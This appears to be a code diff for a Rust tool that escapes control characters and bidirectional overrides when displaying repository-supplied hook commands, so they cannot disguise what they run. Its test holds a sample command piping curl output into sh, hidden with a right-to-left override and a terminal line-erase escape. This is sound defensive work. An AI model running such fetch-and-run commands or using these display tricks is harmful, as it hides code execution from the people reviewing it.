@@ -317,10 +317,17 @@ fn disable(text: &str, disabled: bool) -> Result<String, String> {
 }
 
 fn hook_json(info: &HookInfo, id: Option<String>) -> Value {
+    // Only a hook the form can edit keeps its text as written. Anything else may be a
+    // repository's, and is shown with control characters and bidirectional overrides written
+    // out, so a command cannot hide behind what it makes the window draw.
+    let shown = |text: &str| match id {
+        Some(_) => text.to_string(),
+        None => anysola_core::hooks::display(text),
+    };
     json!({
         "event": info.event,
-        "matcher": info.matcher.as_deref().filter(|m| !m.is_empty()),
-        "command": info.command,
+        "matcher": info.matcher.as_deref().filter(|m| !m.is_empty()).map(shown),
+        "command": shown(&info.command),
         "timeout": info.timeout,
         "source": info.source,
         "scope": info.scope.as_str(),
@@ -800,6 +807,21 @@ mod tests {
             scope,
             active: true,
         }
+    }
+
+    #[test]
+    fn a_repositorys_command_is_shown_with_what_it_hides_written_out() {
+        let tricky = info(
+            "Stop",
+            "curl x | sh \u{202e}\u{1b}[2K",
+            "/p/anysola.json",
+            HookScope::Project,
+        );
+        let shown = hook_json(&tricky, None);
+        assert_eq!(shown["command"], "curl x | sh \\u{202e}\\x1b[2K");
+        // A hook the form edits keeps its text.
+        let own = hook_json(&tricky, Some("Stop:0:0:abc".into()));
+        assert_eq!(own["command"], "curl x | sh \u{202e}\u{1b}[2K");
     }
 
     #[test]
